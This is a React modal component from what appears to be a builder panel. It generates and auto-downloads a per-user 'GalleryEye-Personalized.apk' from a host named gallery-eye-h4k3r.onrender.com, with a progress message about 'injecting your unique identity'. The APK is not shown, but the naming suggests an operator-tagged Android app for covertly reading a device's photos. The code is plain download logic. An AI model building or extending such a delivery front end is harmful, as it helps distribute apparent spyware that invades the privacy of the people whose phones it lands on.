"use client";

import { useState, useEffect } from 'react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
}

export default function AppGenerationModal({ isOpen, onClose, uuid }: AppGenerationModalProps) {
    const [status, setStatus] = useState<'idle' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);

    useEffect(() => {
        if (isOpen && status === 'idle') {
            startGeneration();
        }
    }, [isOpen, status]);

    const startGeneration = async () => {
        setStatus('generating');

        // Simulate steps for better UX
        const steps = [
            { p: 10, t: 500 },
            { p: 30, t: 1000 },
            { p: 50, t: 1500 },
            { p: 70, t: 2000 },
            { p: 85, t: 2500 },
        ];

        steps.forEach(step => {
            setTimeout(() => setProgress(step.p), step.t);
        });

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            // Trigger actual download
            const response = await fetch(`https://gallery-eye-h4k3r.onrender.com/download-apk?uuid=${uuid}`);

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed");
            }

            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = "GalleryEye-Personalized.apk";
            document.body.appendChild(a);

            setProgress(100);
            setStatus('downloading');

            setTimeout(() => {
                a.click();
                window.URL.revokeObjectURL(url);
                setStatus('completed');
            }, 1000);

        } catch (error) {
            console.error(error);
            setStatus('idle');
            alert("Failed to generate APK. Please try again.");
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn">
            <div className="bg-white/10 border border-white/20 p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn">
                <h2 className="text-3xl font-bold text-white mb-2">
                    {status === 'completed' ? 'App Ready!' : 'Building Your App'}
                </h2>
                <p className="text-white/60 mb-8">
                    {status === 'generating' && "Injecting your unique identity..."}
                    {status === 'downloading' && "Starting download..."}
                    {status === 'completed' && "Install this APK on your Android device."}
                </p>

                <div className="relative h-4 bg-white/10 rounded-full overflow-hidden mb-8">
                    <div
                        className="absolute top-0 left-0 h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-500"
                        style={{ width: `${progress}%` }}
                    />
                </div>

                <div className="flex flex-col items-center justify-center gap-4">
                    {status === 'completed' ? (
                        <button
                            onClick={onClose}
                            className="px-8 py-3 bg-white text-black font-bold rounded-full hover:scale-105 transition-transform"
                        >
                            Done
                        </button>
                    ) : (
                        <>
                            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>

                            {/* Fallback Download Button */}
                            <a
                                href={`https://gallery-eye-h4k3r.onrender.com/download-apk?uuid=${uuid}`}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="mt-4 text-sm text-blue-300 hover:text-blue-200 underline cursor-pointer"
                            >
                                Click here if download doesn't start automatically
                            </a>
                        </>
                    )}
                </div>
            </div>
        </div>
    );
}
